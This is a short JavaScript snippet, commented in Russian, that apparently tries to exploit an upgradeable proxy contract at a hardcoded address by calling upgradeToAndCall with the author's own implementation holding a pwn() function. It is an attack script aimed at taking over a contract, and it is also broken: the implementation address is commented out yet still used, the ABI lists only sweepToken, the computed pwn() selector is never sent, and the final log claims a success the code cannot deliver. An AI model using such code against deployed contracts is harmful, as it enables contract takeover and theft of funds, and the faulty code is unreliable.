

async function sendTx() {
const { ethers } = require("ethers");

// Провайдер и signer
const provider = new ethers.providers.Web3Provider(window.ethereum);
await provider.send("eth_requestAccounts", []);
const signer = provider.getSigner();

// Прокси-контракт, который содержит функцию upgradeToAndCall()
const proxyAddress = "0x06b2ddf4ca1ca0f16f20297c16596704be245ec1";
//const newImplementation = "0x4eb43a25db818494db48f8fca0cadb10fb155888"; // адрес твоего контракта с pwn()

// ABI только для нужной функции
const proxyAbi = [
    "function sweepToken(IERC20 token)"
];

// Готовим контракт-прокси
const proxy = new ethers.Contract(proxyAddress, proxyAbi, signer);

// Готовим data: это просто селектор функции pwn()
const data = ethers.utils.hexDataSlice(ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")), 0, 4);

// Отправляем транзакцию
const tx = await proxy.upgradeToAndCall(newImplementation);
await tx.wait();

console.log("✅ upgradeToAndCall выполнено, вызов pwn() отправлен");

}

sendTx();
